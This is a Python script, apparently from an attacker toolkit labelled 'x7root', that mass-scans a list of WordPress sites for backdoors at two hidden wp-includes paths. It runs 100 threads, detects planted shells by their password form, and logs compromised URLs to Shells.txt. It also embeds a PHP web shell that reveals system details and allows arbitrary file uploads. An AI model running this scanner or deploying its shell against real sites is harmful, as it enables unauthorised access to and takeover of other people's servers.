 # -*-coding:Latin-1 -*
import sys , requests, re
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA


print """
                  .------------
                 /             /
                |              |
                |,  .-.  .-.  ,|
                | )(@_/  \@_)( |
                |/     /\     \|
      (@_       (_     ^^     _)
 _     ) \_______\__|IIIIII|__/_________________________
(_)@8@8>>________|-\IIIIII/-|___________________________>
       )_/        \          /
      (@           `--------`
                    x7root
                 Cms : WordPress
                Toolie : backdoor 
        ]-------------------------------------[
"""
shell = """<?php echo "Raiz0WorM"; echo "<br>".php_uname()."<br>"; echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; if($_POST['upload']) { if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) { echo "eXploiting Done"; } else { echo "Failed to Upload."; } } ?>"""
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def apikey(url):
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/css/css.php',timeout=15)
        if "<input name='postpass' type='password'" in check.content or "<input name=postpass type=password" in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-includes/css/css.php\n')
        else:
            check1 = requests.get(url+'/wp-includes/fonts/css.php',timeout=15)
            if "<input name='postpass' type='password'" in check1.content or "<input name=postpass type=password" in check1.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Shells.txt', 'a').write(url + '/wp-includes/fonts/css.php\n')
            else:
                print ' -| ' + url + ' --> {}[Failed]'.format(fr)
    except :
        print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(100)
mp.map(apikey, target)
mp.close()
mp.join()

print '\n [!] {}Saved in Shells.txt'.format(fc)